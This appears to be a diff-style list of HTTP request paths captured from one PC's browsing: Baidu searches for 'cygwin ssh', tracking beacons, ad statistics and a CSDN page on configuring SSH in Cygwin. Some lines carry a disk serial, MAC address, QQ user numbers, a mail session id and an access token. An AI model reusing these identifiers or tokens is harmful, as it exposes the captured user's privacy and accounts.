+/su?wd=cygwi&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910227
+/su?wd=cygwin&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910228
+/it/u=http://www.ln.xinhuanet.com/newscenter/2014-11/29/1113453505_14172202706341n.jpg&fm=30
+/su?wd=cygwin &json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910229
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.9122128183953464
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.9122128183953464
+/u.gif?ts=tt6&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&xp=A6(b)AA2AAAC2&g=focustop-carousel&ep=.622,.467&ci=7&pp=1416,359&ps=1920,8316&u=none&txt=none
+/c.gif?t=5&p=2&q=&ra=0.4758560985792428
+/pae/common/api/invitation?type=get&cb=jQuery1102006119349366053939_1417221910217&_=1417221910230
+/v.gif?mod=superplus:ps&submod=sindex&utype=&superver=superplus&portrait=43825443b5bccaa6401a&glogid=3302617179&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xff8bd64500068ec3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&super_frm=&from_login=&from_reg=&query=cygwin &curcard=1&curcardtab=&_r=0.5603413276840001&m=superplus:ps_searchBtnClick&logactid=1200200001&opType=click&openMode=current&wd=cygwin%20
+/su?wd=cygwin s&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&pbs=cygwin metasploit&cb=jQuery1102006119349366053939_1417221910222&_=1417221910231
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=[{x:456,y:359,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=916427419&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/su?wd=cygwin ss&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&pbs=cygwin metasploit&cb=jQuery1102006119349366053939_1417221910222&_=1417221910232
+/gdt_view.fcg?adposcount=2&uin=738404558&stkey=5E363D15DC3E783C2EB03D012A22D7C56E3391D62E41AFBA7AEEEF77120330253CD0E9A69B4EF046916BD365FF88143A3A821F075E4D82710305626DB3F2B932DAACFB5C978DD93B314A16EF9FEDC6141C2CF6AC5E6E11CD&encid=2&datatype=2&posid=9079261269123257551|648519468150805711|&sext=oufBLT20AGcjxwIQwR7jW9zuaPnICtRYM0LLE3qnAlUNQXbjnk49UWl1xT0PhnpMqfB+qhi6L5DM0oCivOwPJuYL+fh6+n6AxJ7L+4EWtJDR5DtqhnunGZzpLLvVlcjG&clientinfo=QQ2013&reqcount=4&delayedtime=0&freshinfo=null&brand=1
+/su?wd=cygwin ssh&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&pbs=cygwin metasploit&cb=jQuery1102006119349366053939_1417221910222&_=1417221910233
+/c/
+/stat.php?uid=ZCQ7RDRFMVRMJUB&ver=4001
+/gdt/0/CAAAz6JAMBUd-u7C9jBIjuV.jpg/0
+/KsafeSpeedTest/ksafe/queryip.d?ip=61.151.234.23
+/it/u=2745177444,174038397&fm=96&s=5800EC1A091E64CC4C5060D2020080B2
+/it/u=759037530,3976296262&fm=96&s=433083620DCBA7684E719C0F0200C0C2
+/it/u=1826680901,3904436467&fm=96&s=097873821BBABEC84E51D406020070C2
+/c.gif?t=0&q=cygwin+ssh&p=0&pn=1
+/gdt/0/CAAAz6JAMBUd-u7C9jBIjuV.jpg/0
+/gdt_stats.fcg?viewid=_NwcPWAMCh4shpoTMhDZKhdVZovCxzHAqwtxqJILcGcYvQVdN4rQo9ZZh4YKnEl895eIAc_QS7RJ7X7l6r8yKw!bOUTIdoWYx6R6AbaFs_xeX1xv3Lt9dLFCrUoPVqgCw6!zWHddCwkSSFR5hgGVzKEdT0zQSUmKG0ytyNhoMS4_8CukoI7FmEvBVmN13W!qBfgwoirEZ_Y40jIXDyhgdYaUqEd3SSWv&i=1&datatype=jsonp&callback=_cb_gdtjson4
+/poll?r=0.1016038810264751&u=332746458&s=7&k=Q7UBWSdG2k7VEzir&t=0&i=30&r=0.04721708584668294
+/gdt_stats.fcg?viewid0=e1d_BRWoEW8nbpz4Koss0xA3VhoRhIU_M1UI1AVIC9!P1VQ1LLNeI5PsfXDXpHRgB5iYxnEbvFDOv_v8dYbNPgi9WnhpLJp4zJukJNXSYfgPrNxCWOUCU5U_yF1eI59NUw68nDaoY!nbO5CJ8KWE5aHOKxJF6WhWlRfxUmKJjitMvgFt2iQh08Po2PtESFOybIQzpaEf7tw4h5OVAH5u0lqNjrZzhDeM&viewid1=8wce9qjUegQnbpz4Koss02P1ynjiucuQD0tXCODbDfQMZwEC1i2xbNZZh4YKnEl895eIAc_QS7R3dnPyYpo4oeFqoMrypdR!C9FQT7YYvFj7oe7bThiU62IUuZcGZ0y5xgSRuB271MSJMbxJk8Eed3bP5B3Qgccx_vFfT9Ws4lG0f!FcJ5HuTqnEYZOvArxCMX4GY9wna!_oDw3pII4s4g&viewid2=e1d_BRWoEW8nbpz4Koss05ynMtVaQAjNWo9bqEnO0mR!fAY4d4HMRZPsfXDXpHRgB5iYxnEbvFDOv_v8dYbNPgi9WnhpLJp4zJukJNXSYfgPrNxCWOUCU5U_yF1eI59NVf9IRjy5S3Gg2pGKxaDpFqHOKxJF6WhWlRfxUmKJjisGnLGMd5J5i8Po2PtESFOybIQzpaEf7txdEzQtx89aX_bWQnb46ofl&count=3
+/platform
+/InstallCount.aspx?UUID=C801344A-646E-45FD-8929-12E0DB3F95A1&HDSN=      TF655AWJ0AHU2L&MAC=ea-2a-ea-48-1c-be-00-00&OS=71&VER=8.0.1120.1300&TYPE=2&SD=0&VAL=val2
+/souichiro/article/details/6284172
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.07039039139635861
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.07039039139635861
+/u.gif?ts=vx8&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&xp=A6(b)AA2AAAC2&g=focustop-carousel&ep=.467,.156&ci=8&pp=1410,349&ps=1920,8316&u=none&txt=none
+/c.gif?t=5&p=2&q=&ra=0.16281596897169948
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=[{x:450,y:349,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=791408980&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/Login/userpage
+/46aae4d1e2371e4aa769798941cef698/allmobilize.min.js
+/showblogmedal.ashx?blogid=240974
+/js/jquery.cookie.js
+/Login/userpage
+/public/common/tag-suggest-pop/js/main.js?11810182
+/jifen/images/xunzhang/jianzhang/blog3.png
+/0/4/E/1_souichiro.jpg
+/track?0.16419586725533009
+/Tutorials/Hadoop/Images/04 cygwin ssh.png
+/static/api/js/share.js?v=89860593.js?cdnversion=393671
+/getRecommendList.html?jsonp=jsonp1417221916659&userId=luxicheng100&size=10&his=2:6284172&client=blog_cf_enhance&query=如何在Cygwin中安装并配置SSH,cygwin,openssh,openssl,hadoop,管理&cid=3775944053535098827_20140907
+/static/js/shell_v2.js?cdnversion=393673
+/Login
+/Login/self_information
+/Login
+/static/js/bds_s_v2.js?cdnversion=393673
+/pv.aspx?id=24
+/msg.popup.js
+/static/css/bdsstyle.css?cdnversion=20131219
+/socket.io/1/?t=1417221917325
+/bin/logs.php
+/souichiro/comment/list/6284172?page=1
+/index.php/follow/check_is_followed/luxicheng100/SOUICHIRO?jsonpcallback=jsonp1417221916661
+/z/IbCSBMF4EZoVgCwAY4DICaBlAChSCA2EAUwXGmICYBmAdgoRFoIE5aWAOFhaAY2IBmrDqgC2AewBGASwA20gF7FIA4LIDOxVAFdgkCQrmzgAUkoAxOADokZpAAoA7tIB24cY/V2XAFzsErahNqACE7Rw8CBABKO2AAB3jZYkdiSQBraT8LODpAgjt7dIALH1FZMwBhO3l04jsAc2JedPFYyiReYoAncVF6i2oWGytKaHorejt1YFVu6TNLPOoCVHVebuJiFxgkBEoADwJoBFRweO6YUbRwYgA3aX5IW/V0n3F41AB9HxgeWkoYxY4wI1AQQAAA==
+/proxy.html?X-ACL-TOKEN=tag_suggest_kdfjkqwuiplkajmncbsb_token&contentId=tagsCallback1417221917689
+/static/js/logger.js?cdnversion=393673
+/content_push
+/360ap/360apexe_ffb1c2a0954546ea607f25ca8a049fa6_5.1.0.1050.cab
+/z/resource/r/image/2014-11-28/14171516b5bd43aedc76f0f1e21001ea.jpg
+/z/resource/r/image/2014-11-28/a2fbce80ca97ec381024dc73eb042409.jpg
+/poll?r=0.01312484173104167&u=815922797&s=7&k=nqyEMXtnbf6hMD8p&t=0&i=30&r=0.2912506442517042
+/z/resource/r/image/2014-11-28/dce858347d83d0981353f374096d1e88.jpg
+/clubapp/pop/p100000.zip
+/clubapp/pop/p100000.zip
+/clubapp/pop/p100000.zip
+/js/jquery-1.4.2.min.js
+/D/8/B/3_liujunhao225.jpg
+/8/A/2/3_qingtian3721.jpg
+/C/6/A/3_elvis_dataguru.jpg
+/4/3/5/3_bluetears19881.jpg
+/pingback.gif?h=59442CC4D1E8C5D91A9A3E553C3A0361&v=7.2.1.3736&r=0000_sogou_pinyin_72a.1404874898&id=G10000074&passport=&type=popupend&ppversion=3.0.0.1825&region=128&user_disable=0&user_close=1
+/u.gif?ts=k8g&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&cmd=close&tc=11&pd=2066&ft=k8g&at=jw2
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:-683,y:483,t:b},{x:-683,y:614,t:b},{x:-655,y:931,t:b},{x:-566,y:914,t:b}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=1574537234&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/static/api/css/share_style0_16.css?v=f4b44e79.css
+/static/api/js/component/partners.js?v=0923e848.js
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=25538,25538&et=3&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=0&rnd=895299227&si=e9e114d958ea263de46e080563e254c4&st=4&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/tag/csdn/suggest?X-ACL-TOKEN=tag_suggest_kdfjkqwuiplkajmncbsb_token
+/shm/msg_new.php?1=1&jsoncallback=_message_callback
+/www/images/popup/pic_close.gif
+/shm/count_new.php?id=2806&t=1
+/socket.io/1/xhr-polling/DFxgXjA3dhb42LG9pWJb?t=1417221919336
+/webIM/message_pop.css
+/Upload/2014-11-14/280.188.jpg
+/?host=my.oschina.net&hdn=XZNVUO7MsQs6PAwARsVZgw==
+/socket.io/1/xhr-polling/DFxgXjA3dhb42LG9pWJb?t=1417221919437
+/webIM/pic_bg.gif
+/socket.io/1/xhr-polling/DFxgXjA3dhb42LG9pWJb?t=1417221919532
+/gdt_stats.fcg?viewid=_NwcPWAMCh4shpoTMhDZKopKJQrKDJ4PsIvY9jlGgUsjU_A_2PMWpNZZh4YKnEl895eIAc_QS7RJ7X7l6r8yK8GJSdVm4oJyx6R6AbaFs_xeX1xv3Lt9dLFCrUoPVqgCz2F7BV02zqvQmUsM0dA7C6EdT0zQSUmKG0ytyNhoMS6R6B8lWKxyWakD!ff2M_R1BfgwoirEZ_Y40jIXDyhgdXst2oLXN!U6&i=1&datatype=jsonp&callback=_cb_gdtjson5
+/cgi-bin/mail_list?sid=L-BqX-DmjhlgCT9r&folderid=6&folderkey=6&page=1&ver=178907.3&cachemod=maillist&cacheage=7200&r=&selectall=0
+/renwofei423/blog/17602
+/platform
